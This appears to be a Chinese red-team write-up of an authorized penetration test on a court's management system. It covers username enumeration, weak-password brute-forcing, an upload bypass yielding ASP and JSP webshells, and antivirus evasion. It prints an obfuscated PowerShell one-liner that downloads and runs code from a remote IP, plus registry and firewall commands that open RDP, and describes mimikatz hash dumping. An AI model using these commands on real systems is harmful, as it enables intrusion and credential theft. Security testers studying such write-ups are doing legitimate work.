# RT对某法院授权渗透测试

目标站点是某法院的科技法庭管理系统

  

![](../Images/efc60344b0790b22214f84851c64b138.png)

  

在登录的时候发现存在用户名遍历漏洞，

  

![](../Images/2caffa6ac9d36e1c1c0d00d468870459.png)

  

用burp的username字典爆破除了存在的用户名 再根据自用的字典成功爆破出了后台用户。

  

![](../Images/d58ff3e65f61dca89f781fb17497480d.png)

  

所以说打红队的时候弱口令是YYDS第二部进入后台找上传点进入用户特有的法院助手系统

  

![](../Images/0eaf9f354d9baa6872a059d7369554bc.png)

  

没有出现图片上传点，但有doc文档上传点

  

![](../Images/c66d53c05a6d0abdfc5da8290f47ba7e.png)

  

开始的目标重心是关注后缀是否可控，大小写绕过，%00绕过均没有成功响应 直接乱输一个后缀名，发现依然没有回应。莫非是白名单过滤？正常的doc是能够返回路径的，访问url直接下载文件山重水复疑无路，柳暗花明又一村在上面图片的中template找到了突破口 我发现更改template (模板)的值后，文件的回显目录发生了变化 猜测该系统是根据文件类型来定义上传保存目录 doc是默认保存在静态目录下的 于是将改成asp后缀，在对应在文件名修改成asp，成功回显目录，拿下webshell

  

![](../Images/a1276ef282754f085761576d434fc654.png)

  

![](../Images/0005cb5954d3a0dba3581fc45b666893.png)

  

![](../Images/da167446cd1188e76364ea3d00a09f48.png)

  

然而觉得一切开始好起来的时候，在上线CS的时候遇到不少问题 因为目标IIS服务器上是部署了火绒的，

![](../Images/7bd2585784ff4003a667b3d44dd9eff2.png)

  

开始我想直接web投递一句话 发现拒绝访问，应该是被拦截。然后用内存加载shell的方式，上传了加载器和shellcode进行上线 也没有成功，感觉是环境问题，或者火绒直接不准脚本运行？因为我的加载器免杀Win10 360 火绒双开都是能过的既然说不允许访问powershell，考虑应该是权限问题，于是将重心放在了提权上面 之前的思路是上线CS方便横向渗透，顺便跑一波提权脚本 但是现在这条路应该走不下去了，低权限的webshell，还有火绒拦截，应该比较麻烦 这里抛砖引玉 希望大佬有更好的解决办法我是直接陷入了困境。开始访问目标机器上的一些配置文件，比如其他旁站，比如sql的账号密码之类的 结果我意外的发现了tomcat/webapp/doc 这不是tomcat吗？

![](../Images/1812536c0bb1cf97cbf2002cc3f3ba3d.png)

  

为了验证目标机器搭载了tomcat服务，我访问了对应web，发现确实存在 喜出望外，在webapp下写入了jsp木马，成功拿下管理员权限 为了进一步dumphash，开3389，用unicode加密的powshell绕过了火绒成功上线

![](../Images/73c38f54ee95c3390b1894496ee6a208.png)

  

powshell代码参考以下cmd /c echo set-alias -name xz -value IEX;x^z (New-Object "NeT.WeBClienT").d^o^w^n^l^o^a^d^s^t^r^i^n^g('ht'+'tP://1’+'1.111.11.1:80'+'/a') | p^o^w^e^r^s^h^e^l^l -需要提权在cs的web投递做好设置。

![](../Images/c3249d082305361fb2fefc8cfc1d484b.png)

  

之后用mimikatz 和CS的hashdump 导出了管理员密码

执行命令关闭防火墙 成功连接3389

# 启动 3389端口

REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal" "Server /v fDenyTSConnections /t REG\_DWORD /d 00000000 /fnetsh advfirewall firewall add rule name="Open 3389" dir=in action=allow protocol=TCP localport=3389远程之后把火绒关了，之后的路就好走多了 上传fscan进行内网大保健

  

![](../Images/7eaf33e10d1908668d4ad0d698f72aa1.png)

  

跑了一堆打印机和未授权弱口令等等

  

![](../Images/25972bf04beccac130c283903cac9975.png)

  

![](../Images/b923e97bb4744a5ce6eea46e0784356c.png)

  

![](../Images/fd75e408cbeadddad150e9dfdb670456.png)

  

不过多说明了因为该服务器没有其他网卡的机器，也不能通过内网web和ftp等方式进一步拿下同网段其他IP， 所以就把这些攻击结果结果截图提交了。最后我发现，其实之前不一定非得上线CS 因为蚁剑的后渗透框架也是非常强大的 可以直接通过他的反弹shell模块成功上线到MSF

![](../Images/5832d67ce6900e46958072f14f1a815d.png)

  

而且不会报毒，火绒是没有拦截的

  

![](../Images/aec3dc2ea4c43f577f7a0ab670218595.png)

  

，但是至于提权，肯定是没有tomcat提权舒服的 也可以通过MSF拿下webshell之后代理然后去穿内网。也是一种思路吧。
